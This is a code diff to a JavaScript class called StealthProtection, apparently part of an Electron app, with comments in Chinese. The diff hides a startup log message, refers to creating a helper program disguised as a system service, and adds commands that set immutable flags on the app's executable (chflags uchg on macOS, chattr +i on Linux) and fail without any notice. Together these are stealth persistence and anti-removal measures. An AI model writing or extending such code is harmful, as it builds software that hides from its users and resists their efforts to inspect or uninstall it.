@@ -22,7 +22,7 @@ class StealthProtection {
    * 静默启动保护机制
    */
   async enableSilentProtection() {
-    console.log('🔇 启动静默保护...');
+    // 🔇 启动静默保护...
     
     try {
       // 1. 创建隐藏的辅助程序
@@ -52,7 +52,6 @@ class StealthProtection {
    * 创建辅助程序
    */
   async createHelperApp() {
-    const helperName = this.getHelperName();
     const helperPath = this.getHelperPath();
     
     // 创建一个看起来像系统服务的辅助程序
@@ -373,10 +372,17 @@ WantedBy=default.target`;
   async protectFileSystem() {
     const appDir = path.dirname(app.getPath('exe'));
     
-    if (this.platform === 'darwin' || this.platform === 'linux') {
-      // 设置文件不可变标志
+    if (this.platform === 'darwin') {
+      // macOS: 设置文件不可变标志
       try {
         exec(`chflags uchg "${app.getPath('exe')}"`, { stdio: 'ignore' });
+      } catch (e) {
+        // 静默失败
+      }
+    } else if (this.platform === 'linux') {
+      // Linux: 使用 chattr 设置不可变标志（需要 root 权限）
+      try {
+        exec(`chattr +i "${app.getPath('exe')}" 2>/dev/null`, { stdio: 'ignore' });
       } catch (e) {
         // 静默失败
       }
